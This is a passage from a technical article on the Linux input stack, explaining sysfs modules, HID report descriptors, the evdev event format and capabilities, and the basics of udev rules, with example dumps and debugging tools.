    &lt;p&gt;Finally, the last directory that is of interest to us in sysfs is &lt;code&gt;/sys/module/&lt;/code&gt; which provides information and settings for all loaded
kernel modules (the ones that show with &lt;code&gt;lsmod&lt;/code&gt;), their dependencies
and parameters.&lt;/p&gt;
    &lt;code&gt;âââ hid_generic
âÂ Â  âââ drivers
âÂ Â  âÂ Â  âââ hid:hid-generic -&amp;gt; ../../../bus/hid/drivers/hid-generic
âÂ Â  âââ uevent

&amp;gt; modinfo hid_generic
name:           hid_generic
filename:       (builtin)
license:        GPL
file:           drivers/hid/hid-generic
description:    HID generic driver
author:         Henrik Rydberg
&lt;/code&gt;
    &lt;p&gt;Lastly, and it might not need to be mentioned, but sysfs needs to be enabled in the kernel confs. It always is these days since itâs expected by many software.&lt;/p&gt;
    &lt;code&gt;CONFIG_SYSFS=y
&lt;/code&gt;
    &lt;head rend="h1"&gt;HID â Human Interface Device&lt;/head&gt;
    &lt;p&gt;HID, or Human Interface Device, has been mentioned and sprinkled all over the place in the last sections, we said itâs a device protocol but what is it exactly?&lt;/p&gt;
    &lt;p&gt;HID is probably the most important input/output standard device protocol these days, itâs literally everywhere and most new devices, from mice to microphones, speak it over all types of transports such as USB, i2c, Bluetooth, BLE, etcâ¦ Itâs popular because itâs a universal way to let the device first describe its capabilities (buttons, keys, axis, etc..), what it can send/receive (Report Descriptor), and then send/receive them in the expected way (Input/Output/Feature Reports).&lt;lb/&gt; In sum, in the ideal case it would mean avoiding having a specific driver for every new device out there and instead have a centralized generic way to handle all categories of devices, all working out-of-the-box. Indeed, in practice it has worked great and there have only been minor vendor or hardware quirks fixes (&lt;code&gt;drivers/hid/hid-quirks.c&lt;/code&gt; and others).&lt;lb/&gt; For example, a HID Report Descriptor may specify that âin a report with ID 3 the bits from 8 to 15 is the delta x coordinate of a mouseâ. The HID report itself then merely carries the actual data values without any extra meta information.&lt;/p&gt;
    &lt;p&gt;The current list of HID devices can be found under the HID bus in syfs, &lt;code&gt;/sys/bus/hid/devices/&lt;/code&gt;. For each device, say
&lt;code&gt;/sys/bus/hid/devices/0003:1B3F:2008.003E/&lt;/code&gt;, one can read the
corresponding report descriptor:&lt;/p&gt;
    &lt;code&gt;&amp;gt; hexdump -C /sys/bus/hid/devices/0003:1B3F:2008.003E/report_descriptor
00000000  05 0c 09 01 a1 01 15 00  25 01 09 e9 09 ea 75 01  |........%.....u.|
00000010  95 02 81 02 09 e2 09 cd  09 b5 09 b6 09 8c 95 05  |................|
00000020  81 06 09 00 95 01 81 02  c0                       |.........|
00000029
&lt;/code&gt;
    &lt;p&gt;The raw HID reports can also be read from the &lt;code&gt;hidraw&lt;/code&gt; file created by
hid core in devtmpfs &lt;code&gt;/dev/hidrawN&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;What does an input device HID Report and Report Descriptor look like? We wonât go into too much details since the HID specifications are huge but weâll only do a tour to get an idea and be productive with what we know. If you want to dive deeper, check the specifications here, itâs divided into a basic structure doc âHID USB Device Class Definitionâ, and the HUT, âHID Usage Tablesâ, which defines constants to be used by applications.&lt;/p&gt;
    &lt;p&gt;So as we said, the main logic of the protocol is that HID messages are called Reports and that to parse them we need a Report Descriptor. The Report Descriptor is a kind of hashmap stream, it contains Items, which are 1B header followed by an optional payload of up-to 4B. The Items donât make sense by themselves, but do make sense together as a whole when read as a full stream since each Item has a different meaning. Some meaning apply locally and others globally.&lt;/p&gt;
    &lt;p&gt;The encapsulating and/or categorizing Items are the Usage Page, which is a generic category of thing weâre describing, with its subset of Usage, which is the specific thing we control within that Page. These are defined in the âHID Usage Tablesâ doc. Itâs things such as:&lt;/p&gt;
    &lt;code&gt;Usage Page: Generic Desktop (0x01) Usage: Mouse (0x02)
Usage Page: Button (0x09)          Usage: Optional
Usage Page: Consumer Page (0x0C)   Usage: Numeric Key Pad (0x02)
&lt;/code&gt;
    &lt;p&gt;Itâs a couple of info to know how to better handle the HID internal data, it tells you what is actually being handled.&lt;/p&gt;
    &lt;p&gt;Another grouping mechanism is the Collection, a broader category to put together all that the device handles. Letâs say a mouse can have both buttons, a scroll wheel, and axis it moves on, all within a Collection. There are 3 types of collections that encapsulate each others: Application (mandatory) the device-level group, Logical (optional) sub-grouping for related controls, and Physical (optional) sub-grouping for physical sensors.&lt;/p&gt;
    &lt;p&gt;Reports within Collections can also be grouped by IDs to facilitate parsing.&lt;/p&gt;
    &lt;p&gt;Within all these, within the inner Collections, we finally have the definition of what the Reports will actually look like. Hereâs a subset of what a Report Descriptor can look like:&lt;/p&gt;
    &lt;code&gt;Report ID (01)
Usage Page (Button)
Usage Minimum (1)
Usage Maximum (5)
Report Count (5)
Report Size (1)
Input (Data,Var,Abs)

Report Size (3)
Report Count (1)
Input (Cnst,Arr,Abs)

Usage Page (Generic Desktop)
Usage (X)
Usage (Y)
Report Count (2)
Report Size (16)
Logical Minimum (-32767)
Logical Maximum (32767)
Input (Data,Var,Rel)
&lt;/code&gt;
    &lt;p&gt;This is all a single report with ID &lt;code&gt;0x01&lt;/code&gt;, and we see first that within
the Button page we have values ranging from 1 to 5, a count of fields
in the current report size of 5, for 5 buttons each having one bit. The
&lt;code&gt;Input&lt;/code&gt; Item tells us to start processing the Report as input data (thereâs
also &lt;code&gt;Output&lt;/code&gt; and &lt;code&gt;Feature&lt;/code&gt;). It also indicates that buttons have absolute
values, unlike the X/Y axis which are relative.&lt;/p&gt;
    &lt;p&gt;The &lt;code&gt;Cnst&lt;/code&gt; of the following data in the stream stands for constant,
and itâs basically ignored, itâs padding.&lt;/p&gt;
    &lt;p&gt;And so on, we parse the data afterward, the X/Y relative movements.&lt;/p&gt;
    &lt;p&gt;One thing to note, is the scope of the meaning of the Items. Some apply globally, such as the Usage Page, Logical Min/Max, Report Size, Report Count, etc.. Meanwhile, Usage only apply locally and needs to be set again. Other Items have special meaning such as Input, Output, Feature, Collection and End Collection, and are about defining the structure of data and when to process it.&lt;/p&gt;
    &lt;p&gt;Hereâs a full real example with the Collection grouping mechanism:&lt;/p&gt;
    &lt;code&gt;Usage Page (Generic Desktop)
Usage (Mouse)
Collection (Application)
 Usage Page (Generic Desktop)
 Usage (Mouse)
 Collection (Logical)
  Report ID (26)
  Usage (Pointer)
  Collection (Physical)

   Usage Page (Button)
   Usage Minimum (1)
   Usage Maximum (5)
   Report Count (5)
   Report Size (1)
   Logical Minimum (0)
   Logical Maximum (1)
   Input (Data,Var,Abs)

   Report Size (3)
   Report Count (1)
   Input (Cnst,Arr,Abs)

   Usage Page (Generic Desktop)
   Usage (X)
   Usage (Y)
   Report Count (2)
   Report Size (16)
   Logical Minimum (-32767)
   Logical Maximum (32767)
   Input (Data,Var,Rel)

   Usage (Wheel)
   Physical Minimum (0)
   Physical Maximum (0)
   Report Count (1)
   Report Size (16)
   Logical Minimum (-32767)
   Logical Maximum (32767)
   Input (Data,Var,Rel)
  End Collection
 End Collection
End Collection
&lt;/code&gt;
    &lt;p&gt;As you can see, lots of it may seem redundant within the Logical and Physical optional sub-collections but theyâre often there by default for hierarchical grouping. Theyâre not mandatory but common.&lt;lb/&gt; Letâs also note that from hid-inputâs perspective, one device is created per top-level Application Collection, so in theory a device can have many sub-devices.&lt;/p&gt;
    &lt;p&gt;From the kernelâs perspective, the transport bus notices that a device is advertised as an HID class and then the data gets routed to the hid core bus.&lt;/p&gt;
    &lt;p&gt;For example, this is what the USB transport might notice:&lt;/p&gt;
    &lt;code&gt;bInterfaceClass    = 0x03   â USB_CLASS_HID
bInterfaceSubClass = 0x01   â Boot Interface Subclass (optional)
bInterfaceProtocol = 0x02   â Mouse  (0x01 = Keyboard)
&lt;/code&gt;
    &lt;p&gt;And you can clearly see similar ATTRS in the &lt;code&gt;udevadm&lt;/code&gt; trace we took in
earlier in a previous section:&lt;/p&gt;
    &lt;p&gt;The HID core subsystem is in charge of managing the lifecycle (connect/disconnect/open/close), parsing the HID report descriptors to understand the device capabilities. Once parsed, it dispatches Reports to the HID drivers registered on the HID bus, each driver can inspect the Usage Page and Usage to decide how and whether to handle them. This is like a publish-subscribe mechanism. The most specific registered driver (vendor specific) will match and handle Reports in whatever way they see fit, otherwise the hid-generic driver is the fallback.&lt;/p&gt;
    &lt;p&gt;Several &lt;code&gt;*_connect&lt;/code&gt; hooks in the HID core subsystem allow attaching
handlers for different behavior that HID device provide. The most
important for us is the &lt;code&gt;hidinput_connect&lt;/code&gt; for the &lt;code&gt;HID_CONNECT_HIDINPUT&lt;/code&gt;,
to handle HID input devices. Itâs default implementation lives in
&lt;code&gt;hid-input&lt;/code&gt; (internally &lt;code&gt;hidinput_report_event&lt;/code&gt;). Device specific drivers
can override this behavior if needed. The hid-input role is to bridge
with the input core, allocating and registering the input device via
&lt;code&gt;input_register_device&lt;/code&gt;, which will in turn expose &lt;code&gt;/dev/input/eventN&lt;/code&gt;,
as weâve seen before, and translate HID Reports to evdev.&lt;lb/&gt; Similarly, in this pub-sub fan-out fashion, another handler is the default one registered for &lt;code&gt;HID_CONNECT_HIDRAW&lt;/code&gt;, from &lt;code&gt;hidraw.c&lt;/code&gt;
(&lt;code&gt;hidraw_report_event&lt;/code&gt;). This driver will create a raw interface on
devtmpfs (&lt;code&gt;/dev/hidrawN&lt;/code&gt;) to interface with raw HID events that arenât
necessarily input-related.&lt;/p&gt;
    &lt;p&gt;This looks somewhat like this:&lt;/p&gt;
    &lt;p&gt;This is all neat, letâs list a couple of tools that can help us debug HID and inspect HID Reports Descriptors and Reports.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;usbhid-dump&lt;/code&gt;- will dump USB HID device report descriptors and streams&lt;/item&gt;
      &lt;item&gt;hidrdd - verbose description of hid report descriptors&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;hid-tools&lt;/code&gt;- has many sub-tools such as replay, decode, and recording&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;hid-replay&lt;/code&gt;- to test and replay hid events&lt;/item&gt;
      &lt;item&gt;Online USB Descriptor and Request Parser&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The simplest one in my opinion is hid-tools, hereâs an example of a keyboard with consumer control and system control, the same one weâve seen in the procfs introspection interface earlier (&lt;code&gt;/proc/bus/input/&lt;/code&gt;):&lt;/p&gt;
    &lt;p&gt;You can see it has two Application Collections, so thatâs why we had two entries for the keyboard.&lt;/p&gt;
    &lt;p&gt;In some cases, the HID Device Descriptor is wrong and needs some patching, which can either be done in a special driver, or on a live system dynamically by relying on &lt;code&gt;udev-hid-bpf&lt;/code&gt;
which will be invoked before the kernel handles HID.&lt;/p&gt;
    &lt;head rend="h1"&gt;evdev â Event Device&lt;/head&gt;
    &lt;p&gt;Letâs tackle the last piece of the exposed middle-layer that we didnât explain yet: The Event Device common protocol, the evdev layer.&lt;/p&gt;
    &lt;p&gt;From what weâve seen, we know that evdev is a standardization interface, it decouples and abstracts the underlying devices. It could be a USB keyboard, a Bluetooth pointer, or PS/2 device, and all the user needs is to read from the evdev interface, without worrying about their differences.&lt;/p&gt;
    &lt;p&gt;It works because evdev registers itself as the default input handler in the input core, and the main job of most input driver is to translate to it:&lt;/p&gt;
    &lt;p&gt;When its âconnectâ event is fired, it creates the corresponding evdev node in &lt;code&gt;/dev/input/eventN&lt;/code&gt;. Furthermore, the info is also reflected
in sysfs within the &lt;code&gt;/sys/class/input/eventN&lt;/code&gt; directory along with its
related &lt;code&gt;/sys/class/input/inputN&lt;/code&gt; device created by the input core, which
it is the children of (&lt;code&gt;eventN&lt;/code&gt; within &lt;code&gt;inputN&lt;/code&gt;).&lt;/p&gt;
    &lt;p&gt;The evdev driver also supports certain ioctl to query its internal state, let a client handle exclusively grab a device (&lt;code&gt;EVIOCGRAB&lt;/code&gt;), or change certain values. The list of ioctl can be found
here
within libevdev, though libevdev doesnât support all of them (the list
can also be found in &lt;code&gt;include/linux/input.h&lt;/code&gt;).&lt;/p&gt;
    &lt;p&gt;Letâs see what the evdev format is about, and how the input core translates to it and generates the events.&lt;/p&gt;
    &lt;p&gt;The evdev protocol is stateful, it doesnât forward everything to user-space but only does when it notices a change. To inquire about its current state one can rely on ioctl instead.&lt;/p&gt;
    &lt;p&gt;The format of evdev is composed of a series of &lt;code&gt;input_event&lt;/code&gt; (from
&lt;code&gt;include/linux/input.h&lt;/code&gt;) which look like the structure here under,
grouped in whatâs called a sequence or a frame:&lt;/p&gt;
    &lt;p&gt;Basically a timestamp along with a type-code couple and an associated value. The type is the general category to which this event is part of, and the code the sub-category. For example it could be a relative movement (type), on the x-axis (code), of 1 unit (value). The available types of events and codes can be found under &lt;code&gt;include/linux/input-event-codes.h&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;The most common types are:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;EV_KEY&lt;/code&gt;: buttons and keyboards&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;EV_REL&lt;/code&gt;: relative events, on axis or others&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;EV_ABS&lt;/code&gt;: absolute axis value, coordinates, touchscreens&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Each frame ends whenever a synchronization event comes up, the most common is of type.code(value) &lt;code&gt;EV_SYN.SYN_REPORT(0)&lt;/code&gt;. Itâs the marker
that itâs time to make sense of the stream, the whole frame.&lt;/p&gt;
    &lt;p&gt;An example snapshot of a frame of an âabsolute touchpadâ would look like this:&lt;/p&gt;
    &lt;code&gt;E: 30.920519 0003 0018 0031     # EV_ABS / ABS_PRESSURE         31
E: 30.920519 0000 0000 0000     # ------------ SYN_REPORT (0) ---------- +13ms
E: 30.933332 0003 0035 2103     # EV_ABS / ABS_MT_POSITION_X    2103
E: 30.933332 0003 0036 1876     # EV_ABS / ABS_MT_POSITION_Y    1876
E: 30.933332 0003 003a 0029     # EV_ABS / ABS_MT_PRESSURE      29
E: 30.933332 0003 0000 2103     # EV_ABS / ABS_X                2103
E: 30.933332 0003 0001 1876     # EV_ABS / ABS_Y                1876
E: 30.933332 0003 0018 0029     # EV_ABS / ABS_PRESSURE         29
E: 30.933332 0000 0000 0000     # ------------ SYN_REPORT (0) ---------- +13ms
E: 30.946156 0003 003a 0017     # EV_ABS / ABS_MT_PRESSURE      17
E: 30.946156 0003 0018 0017     # EV_ABS / ABS_PRESSURE         17
E: 30.946156 0000 0000 0000     # ------------ SYN_REPORT (0) ---------- +13ms
E: 30.959094 0003 0039 -001     # EV_ABS / ABS_MT_TRACKING_ID   -1
E: 30.959094 0001 014a 0000     # EV_KEY / BTN_TOUCH            0
E: 30.959094 0001 0145 0000     # EV_KEY / BTN_TOOL_FINGER      0
E: 30.959094 0003 0018 0000     # EV_ABS / ABS_PRESSURE         0
E: 30.959094 0000 0000 0000     # ------------ SYN_REPORT (0) ---------- +13ms
&lt;/code&gt;
    &lt;p&gt;And of a keyboard:&lt;/p&gt;
    &lt;code&gt;E: 0.000000 0004 0004 458792    # EV_MSC / MSC_SCAN             458792
E: 0.000000 0001 001c 0000      # EV_KEY / KEY_ENTER            0
E: 0.000000 0000 0000 0000      # ------------ SYN_REPORT (0) ----------
E: 0.560004 0004 0004 458976    # EV_MSC / MSC_SCAN             458976
E: 0.560004 0001 001d 0001      # EV_KEY / KEY_LEFTCTRL         1
E: 0.560004 0000 0000 0000      # ------------ SYN_REPORT (0) ----------
[....]
E: 1.172732 0001 001d 0002      # EV_KEY / KEY_LEFTCTRL         2
E: 1.172732 0000 0000 0001      # ------------ SYN_REPORT (1) ----------
E: 1.200004 0004 0004 458758    # EV_MSC / MSC_SCAN             458758
E: 1.200004 0001 002e 0001      # EV_KEY / KEY_C                1
E: 1.200004 0000 0000 0000      # ------------ SYN_REPORT (0) ----------
&lt;/code&gt;
    &lt;p&gt;As weâve said, itâs stateful, so the events are only sent when there is a state change, even when the hardware keeps resending the same event. So for example, if a key is kept pressed, it wonât resend the event until itâs released.&lt;/p&gt;
    &lt;p&gt;These events might seem simple on their own but are in fact absolutely complex to handle, especially touchpads. There are many features such as pressure, multi-touch, and the tracking of different fingers, which needs an upper layer to make sense of all this. This is where libinput shines, and weâll see that later on. For now just keep in mind itâs a series of event.&lt;/p&gt;
    &lt;p&gt;So how do drivers use evdev to send events, weâve talked about &lt;code&gt;input_event&lt;/code&gt; before, but how does it work.&lt;/p&gt;
    &lt;p&gt;Well, first of before sending any event, the input driver needs at the registration phase to advertise to the system what itâs capable of, to say what kind of events it can generate. These event âcapabilitiesâ, as theyâre called, are a couple of different bits in sets that are also inspectable in sysfs &lt;code&gt;/sys/class/input/inputN/capabilities/&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Youâll find the following types of capabilities:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;ev&lt;/code&gt;, set in&lt;code&gt;input_dev-&amp;gt;evbit&lt;/code&gt;, Which event types the device can generate (&lt;code&gt;EV_KEY&lt;/code&gt;,&lt;code&gt;EV_REL&lt;/code&gt;, etc.)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;key&lt;/code&gt;, set in&lt;code&gt;input_dev-&amp;gt;keybit&lt;/code&gt;, Which key/button codes it supports&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;rel&lt;/code&gt;, set in&lt;code&gt;input_dev-&amp;gt;relbit&lt;/code&gt;, Which relative axes (e.g., REL_X, REL_WHEEL)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;abs&lt;/code&gt;, set in&lt;code&gt;input_dev-&amp;gt;absbit&lt;/code&gt;, Which absolute axes (e.g., ABS_X, ABS_Y)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;led&lt;/code&gt;, set in&lt;code&gt;input_dev-&amp;gt;ledbit&lt;/code&gt;, LED indicators (e.g., keyboard LEDs)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;sw&lt;/code&gt;, set in&lt;code&gt;input_dev-&amp;gt;swbit&lt;/code&gt;, Switch states (e.g., lid switch)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;ff&lt;/code&gt;, set in&lt;code&gt;input_dev-&amp;gt;ffbit&lt;/code&gt;, Force feedback capabilities&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;msc&lt;/code&gt;, set in&lt;code&gt;input_dev-&amp;gt;mscbit&lt;/code&gt;, Miscellaneous events&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;snd&lt;/code&gt;, set in&lt;code&gt;input_dev-&amp;gt;sndbit&lt;/code&gt;, Sound events&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;As you can see, itâs somewhat related the HID capabilities in a sense, but applies to all devices.&lt;/p&gt;
    &lt;p&gt;Weâve also seen these capabilities bits during our inspection of the input core procfs interface &lt;code&gt;/proc/bus/input/&lt;/code&gt; in the &lt;code&gt;B&lt;/code&gt; field:&lt;/p&gt;
    &lt;p&gt;However, parsing the bits manually in procfs or sysfs would be cumbersome, itâs better to rely on tools such as &lt;code&gt;libinput record&lt;/code&gt;, check the
âSupported Eventsâ section:&lt;/p&gt;
    &lt;p&gt;As you can see it also dumps more information such as the HID Report Descriptor and the attached udev properties.&lt;/p&gt;
    &lt;p&gt;Hereâs what you can see from the much longer list that a touchpad generates:&lt;/p&gt;
    &lt;code&gt;# Input device name: "SynPS/2 Synaptics TouchPad"
# Input device ID: bus 0x11 vendor 0x02 \
#            product 0x07 version 0x1b1
# Supported events:
#   Event type 0 (EV_SYN)
#     Event code 0 (SYN_REPORT)
#     Event code 1 (SYN_CONFIG)
#     Event code 2 (SYN_MT_REPORT)
#     Event code 3 (SYN_DROPPED)
#     Event code 4 ((null))
#     Event code 5 ((null))
#     Event code 6 ((null))
#     Event code 7 ((null))
#     Event code 8 ((null))
#     Event code 9 ((null))
#     Event code 10 ((null))
#     Event code 11 ((null))
#     Event code 12 ((null))
#     Event code 13 ((null))
#     Event code 14 ((null))
#   Event type 1 (EV_KEY)
#     Event code 272 (BTN_LEFT)
#     Event code 325 (BTN_TOOL_FINGER)
#     Event code 328 (BTN_TOOL_QUINTTAP)
#     Event code 330 (BTN_TOUCH)
#     Event code 333 (BTN_TOOL_DOUBLETAP)
#     Event code 334 (BTN_TOOL_TRIPLETAP)
#     Event code 335 (BTN_TOOL_QUADTAP)
#   Event type 3 (EV_ABS)
#     Event code 0 (ABS_X)
#       Value   2919
#       Min     1024
#       Max     5112
#       Fuzz       0
#       Flat       0
#       Resolution 42
#     Event code 1 (ABS_Y)
#       Value   3711
#       Min     2024
#       Max     4832
#       Fuzz       0
#       Flat       0
#       Resolution 42
#     Event code 24 (ABS_PRESSURE)
#       Value      0
#       Min        0
#       Max      255
#       Fuzz       0
#       Flat       0
#       Resolution 0
#     Event code 28 (ABS_TOOL_WIDTH)
#       Value      0
#       Min        0
#       Max       15
#       Fuzz       0
#       Flat       0
#       Resolution 0
# Properties:
#   Property  type 0 (INPUT_PROP_POINTER)
#   Property  type 2 (INPUT_PROP_BUTTONPAD)
#   Property  type 4 (INPUT_PROP_TOPBUTTONPAD)
&lt;/code&gt;
    &lt;p&gt;As a note, the Properties can let us know whether weâre dealing with a touchscreen &lt;code&gt;INPUT_PROP_DIRECT&lt;/code&gt;, or a touchpad &lt;code&gt;INPUT_PROP_POINTER&lt;/code&gt;,
and &lt;code&gt;INPUT_PROP_BUTTONPAD&lt;/code&gt; also tells us that itâs a so-called clickpad
(no separate physical buttons but the whole touchpad clicks). These are
hints for libinput to properly handle different kinds of devices.&lt;/p&gt;
    &lt;p&gt;So after registering its capabilities, the input driver simply reports its events by relying on the &lt;code&gt;input_event&lt;/code&gt; function, or one of itâs
many wrappers:&lt;/p&gt;
    &lt;p&gt;Thatâs it mostly to understand evdev! There are multiple tools to help debug evdev-related issues. Weâve seen &lt;code&gt;libinput record&lt;/code&gt;. Similarly,
thereâs the &lt;code&gt;evemu&lt;/code&gt; suite with its record, device, play functions to
simulate and test devices, and &lt;code&gt;evtest&lt;/code&gt;.&lt;lb/&gt; Thereâs also evsieve, a tool to intercept and modify evdev events on the fly.&lt;lb/&gt; Along with these, the library libevdev, in C and python, is the most used to integrate with evdev-related things.&lt;/p&gt;
    &lt;head rend="h1"&gt;udev &amp;amp; hwdb&lt;/head&gt;
    &lt;p&gt;After going through the kernel and exposed layers, weâre finally in user-space!&lt;lb/&gt; The first component weâll see is udev, since we mentioned its role countless times in the previous sections.&lt;/p&gt;
    &lt;p&gt;Udev, or the dynamic user-space device manager, implemented as the udev daemon &lt;code&gt;systemd-udevd&lt;/code&gt;, has as role to take actions whenever a
uevent (&lt;code&gt;PF_NETLINK, NETLINK_KOBJECT_UEVENT&lt;/code&gt;) is sent from the kernel
to user-space. Weâve seen a few of the possible actions it performs,
hereâs a summary of the kind of things it does:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Load kernel modules based on the uevent MODALIAS&lt;/item&gt;
      &lt;item&gt;Set access rights on device nodes&lt;/item&gt;
      &lt;item&gt;Attach properties to devices on detection&lt;/item&gt;
      &lt;item&gt;Create symlinks so that devices have more predictable names&lt;/item&gt;
      &lt;item&gt;Keep track internally of device info in its internal db&lt;/item&gt;
      &lt;item&gt;Use its rule system to take any kind of action on plug/unplug of a device&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The most important part is the last point: udev has a set of rules against which it can match devices and their attributes and take all sorts of actions based on that. The fields it has access to not only come from the uevents but also from all related info on the system.&lt;/p&gt;
    &lt;p&gt;These rules, as is the convention for pretty much all big daemons these days, are read from system locations such as &lt;code&gt;/usr/lib/udev/rules.d&lt;/code&gt;,
&lt;code&gt;/usr/local/lib/udev/rules.d&lt;/code&gt;, and the volatile runtime in
&lt;code&gt;/run/udev/rules.d&lt;/code&gt;, and from the local admin directory of
&lt;code&gt;/etc/udev/rules.d&lt;/code&gt; which takes precedence over the other locations. The
directories contains files with a &lt;code&gt;.rules&lt;/code&gt; extension and are processed and
ordered lexically (&lt;code&gt;01-example.rules&lt;/code&gt; comes before &lt;code&gt;05-example.rules&lt;/code&gt;).&lt;/p&gt;
    &lt;p&gt;Now the syntax of udev rules, which are mainly composed of matching patterns and actions to perform or properties to set upon match, is dense and complex (it even has branching). Only a deep study of &lt;code&gt;udev(7)&lt;/code&gt;
man page will help. Yet, we can still learn the very basics of it to be
able to understand whatâs happening.&lt;lb/&gt; Our approach will consist of, first checking two examples, then have a general overview of the possible components of the syntax, and finally talking about the particularities of that system.&lt;/p&gt;
    &lt;p&gt;The first example is quite simple, it will run a script when a specific keyboard is plugged/unplugged.&lt;/p&gt;
    &lt;p&gt;The rule is pretty clear about what it does, on âaddâ or âremoveâ action for specific match itâll execute a script. But youâll also notice that the match components such as SUBSYSTEM and ATTRS are things weâve seen before in previous traces of &lt;code&gt;udevadm info&lt;/code&gt;, which is exactly the point. &lt;code&gt;udevadm
info&lt;/code&gt; will show us certain components we can used to match.&lt;/p&gt;
    &lt;p&gt;The second example is a tad bit more complex, we will parse &lt;code&gt;/usr/lib/udev/rules.d/60-persistent-input.rules&lt;/code&gt;. That file creates
a more persistent naming scheme for input devices in devtmpfs under
&lt;code&gt;/dev/input/by-id&lt;/code&gt; and &lt;code&gt;/dev/input/by-path/&lt;/code&gt;. Hereâs a simplified version
of it.&lt;/p&gt;
    &lt;p&gt;We can see multiple things from this short example. First of all, the branching mechanism with its use of &lt;code&gt;GOTO&lt;/code&gt; whenever certain matches
donât fit the specific use-case. We can also see the standard comparison
operators such as &lt;code&gt;==&lt;/code&gt; and &lt;code&gt;!=&lt;/code&gt;.&lt;lb/&gt; Then we see different variables/values that are either compared against such as &lt;code&gt;SUBSYSTEM&lt;/code&gt;, &lt;code&gt;ACTION&lt;/code&gt;, &lt;code&gt;KERNEL&lt;/code&gt;, &lt;code&gt;ATTRS{â¦}&lt;/code&gt;, &lt;code&gt;ENV{}&lt;/code&gt;, or
assigned such as &lt;code&gt;ENV{â¦}&lt;/code&gt;, &lt;code&gt;GOTO&lt;/code&gt;, or &lt;code&gt;SYMLINK&lt;/code&gt;. The assignment seems
to either use &lt;code&gt;=&lt;/code&gt; or &lt;code&gt;+=&lt;/code&gt;.&lt;lb/&gt; Furthermore, from this example we can also see some regex-like pattern matching, and string substitution within assignment.&lt;/p&gt;
    &lt;p&gt;Yet, overall the idea makes sense. We create some string variable based on what type of input device weâre dealing with (prepended with &lt;code&gt;.&lt;/code&gt;
means itâs only temporary), which we found in &lt;code&gt;ENV{â¦}&lt;/code&gt;, the device
properties. Then for event devices we create two symlink files in
different directories âby-idâ and âby-pathâ. For the by-id itâs composed
of the bus name, followed by the device name, â-event-â, and the input
class weâve stored in the temporary variable.&lt;/p&gt;
    &lt;p&gt;Letâs see how that would look for this device:&lt;/p&gt;
    &lt;p&gt;The lines starting with &lt;code&gt;E:&lt;/code&gt; are device properties that are in &lt;code&gt;ENV{â¦}&lt;/code&gt;,
the meaning can be found in &lt;code&gt;udevadm(8)&lt;/code&gt; manpage, which weâll see more
of in other examples.&lt;lb/&gt; So from this, the device should be symlinked as &lt;code&gt;/dev/input/by-id/usb-SEMICO_USB_Keyboard-event-kbd&lt;/code&gt;, which it indeed is.&lt;/p&gt;
    &lt;p&gt;Thatâs a neat example, it gives us a generic idea of udev. Letâs continue and try to get a more general idea of the udev syntax.&lt;/p&gt;
    &lt;p&gt;So far weâve seen that the rules files contain key-value pairs, or comments starting with &lt;code&gt;#&lt;/code&gt; as is standard in most conf files, and
has operators that are either for comparison, &lt;code&gt;==&lt;/code&gt; and &lt;code&gt;!=&lt;/code&gt;, or for
assignment, weâve seen &lt;code&gt;=&lt;/code&gt; and &lt;code&gt;+=&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;The difference between these two assignment operators is that some variables/keys are lists, and the &lt;code&gt;+=&lt;/code&gt; appends to that list, while the
&lt;code&gt;=&lt;/code&gt; operator would basically empty the list and set only the single
value in it. Additionally, there are two other assignment operators
we havenât seen: the &lt;code&gt;-=&lt;/code&gt; to remove a value from a list, and the &lt;code&gt;:=&lt;/code&gt;
which sets a constant and disallow future change.&lt;/p&gt;
    &lt;p&gt;How to know if something is a list or a scalar value, and if the key can be used in comparison or assignment. Well, it depends on the key itself, which are listed in the man page &lt;code&gt;udev(7)&lt;/code&gt;, weâll see the most common
but first letâs talk about the values.&lt;/p&gt;
    &lt;p&gt;The values assigned are always strings within double quotes, and use the usual same escape mechanism that C and other languages use. It also allows case-insensitive comparison by having the string preceded by âiâ, such as &lt;code&gt;i"casedoesn't matter"&lt;/code&gt;.&lt;lb/&gt; The strings also allow internal substitution with variables/keys, some that can be set on the fly, from the match, or from a set of global ones. Itâs similar to a lot of languages: &lt;code&gt;"hello $kernel $env{ID_PATH}"&lt;/code&gt;.
This is what weâve seen in one of our examples.&lt;lb/&gt; Furthermore, if a string is used during matching, it can include glob patterns, also the usual ones, such as &lt;code&gt;*&lt;/code&gt; to match zero or more
characters, &lt;code&gt;?&lt;/code&gt; to match a single characters, &lt;code&gt;|&lt;/code&gt; for the or separator,
and &lt;code&gt;[]&lt;/code&gt; to match a set of characters. Obviously, these special characters
will need to be escaped if used as-is.&lt;/p&gt;
    &lt;p&gt;Now, as we said there are keys used to do matching/searching, and keys that allow assigning values (list or not), yet whatâs confusing is that lots of keys can be used for both, but not all of them. A quick look at &lt;code&gt;udev(7)&lt;/code&gt; to be sure doesnât hurt.&lt;/p&gt;
    &lt;p&gt;Here are some common matching keys:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;KERNEL&lt;/code&gt;: kernel name&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;SUBSYSTEM&lt;/code&gt;: the kernel subsystem the device is associated to&lt;/item&gt;
